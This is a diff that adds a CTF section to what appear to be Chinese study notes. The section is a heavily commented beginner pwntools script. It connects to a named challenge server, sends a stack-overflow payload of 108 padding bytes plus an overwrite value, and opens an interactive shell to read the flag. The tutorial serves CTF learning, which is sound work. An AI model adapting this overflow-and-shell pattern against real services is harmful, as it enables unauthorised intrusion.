@@ -12,7 +12,87 @@
           四、汇编：
 
           五、linux指令：
-          
+
+          六、ctf:
+          #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# 导入pwntools库
+from pwn import *
+
+# 设置程序运行环境为64位Linux
+context(arch='amd64', os='linux')
+
+def main():
+    print("=== CTF PWN 签到题利用脚本 ===")
+    print("作者：PWN新手教程")
+    print()
+    
+    # 第一步：连接到远程服务器
+    print("[1] 正在连接到远程服务器...")
+    # remote()函数用于建立TCP连接
+    # 参数1：主机地址
+    # 参数2：端口号
+    p = remote('challenge.imxbt.cn', 30942)
+    
+    # 第二步：接收程序初始输出
+    print("[2] 接收程序输出...")
+    # recvuntil()等待直到收到指定字符串
+    # 这里等待"do you like blueshark?\n"
+    output = p.recvuntil(b"do you like blueshark?\n")
+    print("程序输出：", output.decode('utf-8'))
+    
+    # 第三步：构造payload
+    print("[3] 构造payload...")
+    # payload由两部分组成：
+    # 1. 108个'a'字符作为填充
+    # 2. 目标值0xADDAAAAA（转换为小端序）
+    
+    # 方法1：使用p64()函数（推荐）
+    payload = b'a' * 108  # 填充108字节
+    payload += p64(0xADDAAAAA)  # 添加目标值
+    
+    # 方法2：手动构造小端序（理解原理）
+    # payload = b'a' * 108 + b'\xaa\xaa\xda\xad\x00\x00\x00\x00'
+    
+    print(f"Payload长度：{len(payload)} 字节")
+    print(f"Payload内容（十六进制）：{payload.hex()}")
+    
+    # 第四步：发送payload
+    print("[4] 发送payload...")
+    # send()发送数据，不添加换行符
+    # sendline()会添加换行符，这里不要用
+    p.send(payload)
+    
+    # 第五步：接收程序响应
+    print("[5] 接收程序响应...")
+    # 尝试接收一些输出
+    try:
+        response = p.recv(timeout=2)
+        print("程序响应：", response.decode('utf-8', errors='ignore'))
+    except:
+        print("没有收到响应或响应无法解码")
+    
+    # 第六步：尝试交互模式
+    print("[6] 尝试进入交互模式...")
+    print("如果成功，你现在可以输入命令了！")
+    print("常用命令：")
+    print("  ls - 查看当前目录")
+    print("  cat flag - 查看flag文件")
+    print("  whoami - 查看当前用户")
+    print("  exit - 退出")
+    print()
+    print("按Ctrl+D可以退出交互模式")
+    
+    # interactive()进入交互模式
+    p.interactive()
+    
+    # 第七步：关闭连接
+    print("[7] 关闭连接...")
+    p.close()
+
+if __name__ == "__main__":
+    main()
 
 
 
